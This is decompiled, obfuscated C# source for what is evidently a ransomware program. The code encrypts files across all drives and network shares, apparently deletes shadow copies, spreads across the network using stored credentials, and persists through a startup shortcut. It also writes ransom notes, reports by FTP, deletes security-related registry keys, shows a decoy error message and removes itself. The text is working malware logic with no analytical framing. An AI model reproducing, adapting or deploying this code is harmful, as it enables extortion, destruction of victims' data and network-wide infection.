				if (!getOSInfo().Contains(getString_0(107389581)))
				{
					Empowered(PowerList);
				}
				else
				{
					List<string> source4 = vssList;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
						{
							ProcessCommand(Base64Decode(ReverseString(getString_0(107389865))), string_0);
						};
					}
					Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				}
				List<string> source5 = delList;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						ProcessCommand(Base64Decode(getString_0(107389840)), string_0);
					};
				}
				Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				List<string> drvList = DrvList;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
					{
						ProcessCommand(getString_0(107389855), string_0);
					};
				}
				Parallel.ForEach(drvList, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && CleanMemory)
			{
				try
				{
					Thread thread4 = new Thread(Monitor.RunningProcesses);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			ProcessCommand(getString_0(107396834), Base64Decode(getString_0(107396789)));
			ProcessCommand(getString_0(107396834), Base64Decode(getString_0(107396716)));
			ProcessCommand(Base64Decode(getString_0(107397171)), Base64Decode(getString_0(107397190)));
			ProcessCommand(Base64Decode(getString_0(107397171)), Base64Decode(getString_0(107397060)));
		}
		if (SpreadOverNetwork == getString_0(107396917) && Internet() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(NetworkSpreading.Run);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = WoL == getString_0(107396917);
		SecureString secureString = new SecureString();
		if (StaticLooks == getString_0(107396374))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			DynamicPass = getString_0(107396369);
		}
		UniqueId = CryptographyHelper.Encrypt(ToInsecureString(secureString));
		if (localreport)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), LocalReportFileName)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), LocalReportFileName), string.Concat(Base64Decode(getString_0(107396356)), new WebClient().DownloadString(Base64Decode(getString_0(107396299))), getString_0(107396290), Base64Decode(getString_0(107396285)), DateTime.Now, getString_0(107396290), Base64Decode(getString_0(107396212)), UniqueId));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), LocalReportFileName), getString_0(107396699) + UniqueId);
				}
			}
			catch (Exception ex7)
			{
				if (debugmode)
				{
					try
					{
						File.AppendAllText(DebugReport, getString_0(107396670) + ex7.Message + getString_0(107396290));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		Shortcut.Create(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), MyStartName), LeaveRegards(UniqueId), null, null, getString_0(107396589), getString_0(107396604), null);
		if (LANShares == getString_0(107396917))
		{
			try
			{
				MapDrv();
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			EnableLong();
		}
		try
		{
			Crypt(new string[1] { getString_0(107396555) }, new string[100]
			{
				getString_0(107396578),
				getString_0(107396573),
				getString_0(107396536),
				getString_0(107396527),
				getString_0(107396522),
				getString_0(107396549),
				getString_0(107396544),
				getString_0(107396539),
				getString_0(107396502),
				getString_0(107396497),
				getString_0(107396492),
				getString_0(107396519),
				getString_0(107396510),
				getString_0(107396505),
				getString_0(107396464),
				getString_0(107396459),
				getString_0(107396486),
				getString_0(107396481),
				getString_0(107396476),
				getString_0(107395927),
				getString_0(107395918),
				getString_0(107395913),
				getString_0(107395940),
				getString_0(107395935),
				getString_0(107395930),
				getString_0(107395893),
				getString_0(107395888),
				getString_0(107395883),
				getString_0(107395910),
				getString_0(107395905),
				getString_0(107395900),
				getString_0(107395863),
				getString_0(107395858),
				getString_0(107395853),
				getString_0(107395876),
				getString_0(107395871),
				getString_0(107395866),
				getString_0(107395829),
				getString_0(107396544),
				getString_0(107395824),
				getString_0(107396502),
				getString_0(107395847),
				getString_0(107395842),
				getString_0(107395837),
				getString_0(107395800),
				getString_0(107395795),
				getString_0(107395790),
				getString_0(107395785),
				getString_0(107395812),
				getString_0(107395807),
				getString_0(107395802),
				getString_0(107395765),
				getString_0(107395760),
				getString_0(107395755),
				getString_0(107395782),
				getString_0(107395777),
				getString_0(107395772),
				getString_0(107395735),
				getString_0(107395726),
				getString_0(107395721),
				getString_0(107395744),
				getString_0(107395699),
				getString_0(107395824),
				getString_0(107395718),
				getString_0(107395709),
				getString_0(107396180),
				getString_0(107396171),
				getString_0(107396194),
				getString_0(107396185),
				getString_0(107396148),
				getString_0(107396139),
				getString_0(107396162),
				getString_0(107396153),
				getString_0(107396116),
				getString_0(107396111),
				getString_0(107396106),
				getString_0(107396133),
				getString_0(107396128),
				getString_0(107396123),
				getString_0(107396082),
				getString_0(107396077),
				getString_0(107396104),
				getString_0(107396099),
				getString_0(107396094),
				getString_0(107396089),
				getString_0(107396048),
				getString_0(107396071),
				getString_0(107396066),
				getString_0(107395858),
				getString_0(107396061),
				getString_0(107396024),
				getString_0(107396019),
				getString_0(107396014),
				getString_0(107396009),
				getString_0(107396032),
				getString_0(107396027),
				getString_0(107395990),
				getString_0(107395981),
				getString_0(107396008),
				getString_0(107396003)
			}, new string[0], ToInsecureString(secureString), getString_0(107395998));
		}
		catch (Exception ex9)
		{
			if (debugmode)
			{
				try
				{
					File.AppendAllText(DebugReport, getString_0(107395953) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395416)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395416));
				streamWriter.WriteLine(Base64Decode(getString_0(107395383)));
				streamWriter.WriteLine(getString_0(107396290));
				streamWriter.WriteLine(Base64Decode(getString_0(107393829)));
				streamWriter.WriteLine(UniqueId);
				if (MultipleThreads == getString_0(107396374))
				{
					streamWriter.WriteLine(getString_0(107396290));
					streamWriter.WriteLine(Base64Decode(getString_0(107393796)) + Convert.ToString(EncryptedFiles.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395416), getString_0(107393687) + UniqueId);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string encryptedDir in EncryptedDirs)
		{
			num++;
			try
			{
				if (encryptedDir == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(encryptedDir + getString_0(107395416)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395416), encryptedDir + getString_0(107395416), overwrite: true);
				}
				else
				{
					File.AppendAllText(encryptedDir + getString_0(107395416), getString_0(107393687) + UniqueId);
				}
			}
			catch (Exception)
			{
			}
			if (!multinote && num > 10)
			{
				break;
			}
		}
		if (RichText == getString_0(107396917))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393690)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393690));
					streamWriter2.WriteLine(Base64Decode(getString_0(107393657)));
					streamWriter2.WriteLine(getString_0(107396290));
					streamWriter2.WriteLine(Base64Decode(getString_0(107394152)));
					streamWriter2.WriteLine(UniqueId + Base64Decode(getString_0(107394031)));
					if (MultipleThreads == getString_0(107396374))
					{
						streamWriter2.WriteLine(getString_0(107396290));
						streamWriter2.WriteLine(Base64Decode(getString_0(107394050)) + Base64Decode(getString_0(107393796)) + Convert.ToString(EncryptedFiles.Count) + Base64Decode(getString_0(107394031)));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393690), Base64Decode(getString_0(107394050)) + getString_0(107393687) + UniqueId + Base64Decode(getString_0(107394031)));
				}
			}
			catch
			{
			}
		}
		if (FtpLog == getString_0(107396917))
		{
			try
			{
				if (MultipleThreads == getString_0(107396374))
				{
					UtilMe.Send(getString_0(107393989), getString_0(107393984), getString_0(107393939), string.Concat(Base64Decode(getString_0(107396356)), new WebClient().DownloadString(Base64Decode(getString_0(107396299))), getString_0(107393930), Base64Decode(getString_0(107396285)), DateTime.Now, getString_0(107396290), Base64Decode(getString_0(107393957)), Convert.ToString(EncryptedFiles.Count), getString_0(107396290), Base64Decode(getString_0(107396212)), UniqueId));
				}
				else
				{
					UtilMe.Send(getString_0(107393989), getString_0(107393984), getString_0(107393939), string.Concat(Base64Decode(getString_0(107396356)), new WebClient().DownloadString(Base64Decode(getString_0(107396299))), getString_0(107393930), Base64Decode(getString_0(107396285)), DateTime.Now, getString_0(107396290), Base64Decode(getString_0(107393957)), Convert.ToString(EncryptedFiles.Count), getString_0(107396290), Base64Decode(getString_0(107396212)), UniqueId));
				}
			}
			catch
			{
			}
		}
		if (WallpaperChanger == getString_0(107396917))
		{
			try
			{
				Wallpaper.Set(new Uri(getString_0(107393364)));
			}
			catch
			{
			}
		}
		if (RichText == getString_0(107396374))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395416)))
				{
					Process.Start(Base64Decode(getString_0(107393363)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395416));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393690)))
				{
					Process.Start(Base64Decode(getString_0(107393370)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393690));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(toolLocation))
		{
			try
			{
				File.Delete(toolLocation);
			}
			catch
			{
			}
		}
		if (debugmode)
		{
			try
			{
				File.AppendAllText(DebugReport, getString_0(107393321));
			}
			catch (Exception)
			{
			}
		}
		if (imha == getString_0(107393340))
		{
			CleanMyStuff();
		}
	}

	public static void Deceive()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(Base64Decode(getString_0(107393299)), Base64Decode(getString_0(107393177)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int NextInt(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> TraverseTree(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains(getString_0(107393160)) && !text.ToLower().Contains(getString_0(107393619)) && !text.ToLower().Contains(getString_0(107393638)) && !text.ToLower().Contains(getString_0(107393625)) && !text.ToLower().Contains(getString_0(107393600)) && !text.ToLower().Contains(getString_0(107393547)) && !text.ToLower().Contains(getString_0(107393566)) && !text.ToLower().Contains(getString_0(107393521)) && !text.ToLower().Contains(getString_0(107393484)) && !text.ToLower().Contains(getString_0(107393507)) && !text.ToLower().Contains(getString_0(107393458)) && !text.ToLower().Contains(getString_0(107393547)) && !text.ToLower().Contains(getString_0(107393477)) && !text.ToLower().Contains(getString_0(107393424)))
				{
					array = Directory.GetFiles(text);
					goto IL_01eb;
				}
			}
			catch
			{
			}
			continue;
			IL_01eb:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107393399)) && !fileInfo.FullName.Contains(getString_0(107393414)) && !fileInfo.FullName.Contains(getString_0(107392853)) && !fileInfo.FullName.Contains(getString_0(107392868)) && !fileInfo.FullName.Contains(getString_0(107392819)) && !fileInfo.FullName.Contains(getString_0(107392834)) && !fileInfo.FullName.Contains(getString_0(107392785)) && !fileInfo.FullName.Contains(getString_0(107392800)) && !fileInfo.FullName.Contains(getString_0(107392755)) && !fileInfo.FullName.Contains(getString_0(107392766)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392721)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392740)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392691)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392706)) && !fileInfo.FullName.Contains(Base64Decode(getString_0(107392657))) && !fileInfo.FullName.Contains(getString_0(107392632)) && !fileInfo.FullName.Contains(getString_0(107392619)) && !fileInfo.FullName.EndsWith(getString_0(107395998)) && !fileInfo.FullName.EndsWith(getString_0(107393106)) && !fileInfo.FullName.EndsWith(getString_0(107393101)) && !fileInfo.FullName.EndsWith(getString_0(107393128)) && !fileInfo.FullName.EndsWith(getString_0(107393123)) && !fileInfo.FullName.Contains(getString_0(107393118)) && !fileInfo.FullName.Contains(MyStartName) && !fileInfo.FullName.Contains(DebugReport) && !fileInfo.FullName.Contains(LocalReportFileName))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == getString_0(107396917))
						{
							list.Add(fileInfo.FullName);
							WorkerCrypter2(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && Size == getString_0(107396374))
						{
							list.Add(fileInfo.FullName);
							WorkerCrypter2(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string ProcessCommand(string command = "", string arguments = "")
	{
		string result = getString_0(107393364);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = command,
				Arguments = arguments,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void RunPS(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393069),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string ReverseString(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string Base64Decode(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void MapDrv()
	{
		//IL_05b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b8: Expected O, but got Unknown
		//IL_05d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05da: Expected O, but got Unknown
		NetworkSpreading.LocalNet();
		Ip3 = NetworkSpreading.GetIPAddresses();
		List<IPInfo> iPInfo = IPInfo.GetIPInfo();
		foreach (IPInfo item in iPInfo)
		{
			Ip2.Add(item.IPAddress);
		}
		Ip1 = Ip3.Union(Ip2).ToList();
		foreach (string item2 in Ip1)
		{
			if ((!item2.StartsWith(getString_0(107393084)) && !item2.StartsWith(getString_0(107393047)) && !item2.StartsWith(getString_0(107393038)) && !item2.StartsWith(getString_0(107393364))) || !NetworkSpreading.PingHost(item2))
			{
				continue;
			}
			try
			{
				if (CredActivate == getString_0(107396917))
				{
					for (int i = 0; i < NetworkSpreading.names.Count; i++)
					{
						ProcessCommand(getString_0(107393057), getString_0(107393012) + item2 + getString_0(107393003) + NetworkSpreading.names[i] + getString_0(107393022) + NetworkSpreading.passes[i]);
					}
				}
				else
				{
					ProcessCommand(getString_0(107393057), getString_0(107393012) + item2);
				}
			}
			catch
			{
			}
		}
		try
		{
			NetworkSpreading.ServerEnum serverEnum = new NetworkSpreading.ServerEnum(NetworkSpreading.ResourceScope.RESOURCE_GLOBALNET, NetworkSpreading.ResourceType.RESOURCETYPE_DISK, NetworkSpreading.ResourceUsage.RESOURCEUSAGE_ALL, NetworkSpreading.ResourceDisplayType.RESOURCEDISPLAYTYPE_NETWORK);
			foreach (string item3 in serverEnum)
			{
				MatchCollection matchCollection = Regex.Matches(item3, getString_0(107393017));
				foreach (Match item4 in matchCollection)
				{
					try
					{
						if (CredActivate == getString_0(107396917))
						{
							for (int j = 0; j < NetworkSpreading.names.Count; j++)
							{
								ProcessCommand(getString_0(107393057), getString_0(107392936) + item4.ToString() + getString_0(107393003) + NetworkSpreading.names[j] + getString_0(107393022) + NetworkSpreading.passes[j]);
							}
						}
						else
						{
							ProcessCommand(getString_0(107393057), getString_0(107392936) + item4.ToString());
						}
					}
					catch
					{
					}
					if (!DizonList.Contains(item4.ToString()))
					{
						DizonList.Add(item4.ToString());
					}
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = ReverseString(getString_0(107392927));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Base64Decode(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(Base64Decode(getString_0(107392278)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(Base64Decode(getString_0(107392253)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (HorseMount == getString_0(107396917))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107392176), getString_0(107392199));
				File.WriteAllText(text, Base64Decode(getString_0(107392190)), Encoding.ASCII);
				ProcessCommand(getString_0(107396834), getString_0(107391104) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391099))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391099)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391570))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391570)));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107391561));
		ManagementObjectEnumerator enumerator5 = val.Get().GetEnumerator();
		try
		{
			while (enumerator5.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator5.get_Current();
				if (!DizonList.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391508), getString_0(107396839)).Replace(getString_0(107391503), getString_0(107391508))
					.Replace(getString_0(107391526), getString_0(107393364))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					DizonList.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391508), getString_0(107396839)).Replace(getString_0(107391503), getString_0(107391508))
						.Replace(getString_0(107391526), getString_0(107393364))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107391521), getString_0(107393364)) + getString_0(107391480));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator5)?.Dispose();
		}
	}

	public static bool Internet()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107391471));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void Empowered(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = Base64Decode(getString_0(107391438));
		processStartInfo.Arguments = getString_0(107391409) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool SetAccess(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string ToInsecureString(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void TerminateSnooper()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = ReverseString(getString_0(107391404));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Base64Decode(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(Base64Decode(getString_0(107390786)));
					registryKey.DeleteSubKey(Base64Decode(getString_0(107390729)));
					registryKey.DeleteSubKey(Base64Decode(getString_0(107390712)));
					registryKey.DeleteSubKey(Base64Decode(getString_0(107390719)));
					registryKey.DeleteSubKey(Base64Decode(getString_0(107391438)));
					registryKey.DeleteSubKey(Base64Decode(getString_0(107390694)));
					registryKey.DeleteSubKey(Base64Decode(getString_0(107390633)));
					registryKey.Close();
				}
				string_ = ReverseString(getString_0(107390616));
				registryKey = Registry.LocalMachine.OpenSubKey(Base64Decode(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(Base64Decode(getString_0(107391031)));
					registryKey.Close();
				}
				string_ = ReverseString(getString_0(107391046));
				registryKey = Registry.LocalMachine.OpenSubKey(Base64Decode(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(Base64Decode(getString_0(107391031)));
					registryKey.Close();
				}
				string_ = ReverseString(getString_0(107391046));
				registryKey = Registry.CurrentUser.OpenSubKey(Base64Decode(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(Base64Decode(getString_0(107391031)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			ProcessCommand(Base64Decode(getString_0(107390997)), Base64Decode(getString_0(107391012)));
			ProcessCommand(Base64Decode(getString_0(107390931)), Base64Decode(getString_0(107390922)));
			ProcessCommand(Base64Decode(getString_0(107390931)), Base64Decode(getString_0(107390264)));
			ProcessCommand(Base64Decode(getString_0(107390235)), Base64Decode(getString_0(107390186)));
		}
		catch
		{
		}
	}

	public static void WriteSignatureFullEncode(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(Base64Decode(getString_0(107390145)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void EnableLong()
	{
		string string_ = ReverseString(getString_0(107390120));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Base64Decode(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(Base64Decode(getString_0(107390519)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void CleanMyStuff()
	{
		ProcessCommand(getString_0(107396834), Base64Decode(getString_0(107390486)));
		string text = Base64Decode(getString_0(107389780));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107391526) + text + getString_0(107391526) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396834);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void RemoveReadOnlyAttribute(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (debugmode)
			{
				try
				{
					File.AppendAllText(DebugReport, getString_0(107389715) + string_0 + getString_0(107389706) + ex.Message + getString_0(107396290));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string getOSInfo()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107393364);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107389617);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107389672))) ? getString_0(107389622) : getString_0(107389663));
				break;
			case 0:
				text = getString_0(107389645);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107389612);
				break;
			case 4:
				text = getString_0(107389631);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107389581) : getString_0(107389590));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107389557) : getString_0(107389594)) : getString_0(107389599)) : getString_0(107389608));
				break;
			case 10:
				text = getString_0(107389552);
				break;
			}
		}
		if (text != getString_0(107393364))
		{
			text = getString_0(107389547) + text;
			if (oSVersion.ServicePack != getString_0(107393364))
			{
				text = text + getString_0(107393022) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string LeaveRegards(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395416);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(Base64Decode(getString_0(107395383)));
				streamWriter.WriteLine(getString_0(107396290));
				streamWriter.WriteLine(Base64Decode(getString_0(107393829)));
				streamWriter.WriteLine(string_0);
			}
			else
			{
				File.AppendAllText(text, getString_0(107393687) + string_0);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (debugmode)
			{
				try
				{
					File.AppendAllText(DebugReport, getString_0(107389566) + ex.Message + getString_0(107396290));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void Crypt(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		_003C_003Ec__DisplayClass21._003C_003Ec__DisplayClass25 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass21();
		CS_0024_003C_003E8__locals0.uzantilar = string_1;
		CS_0024_003C_003E8__locals0.excomunicated = string_2;
		CS_0024_003C_003E8__locals0.sifre = string_3;
		CS_0024_003C_003E8__locals0.crypt_uzantisi = string_4;
		PasswordBytes = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.sifre);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396555))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !DizonList.Contains(array[i].Name))
					{
						DizonList.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!DizonList.Contains(string_0[j]))
				{
					DizonList.Add(string_0[j]);
				}
			}
		}
		if (DizonList.Contains(Base64Decode(getString_0(107390021))) && SkipC == getString_0(107396917))
		{
			DizonList.Remove(Base64Decode(getString_0(107390021)));
		}
		Parallel.ForEach(DizonList, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass21._003C_003Ec__DisplayClass25();
			CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals22 = CS_0024_003C_003E8__locals0;
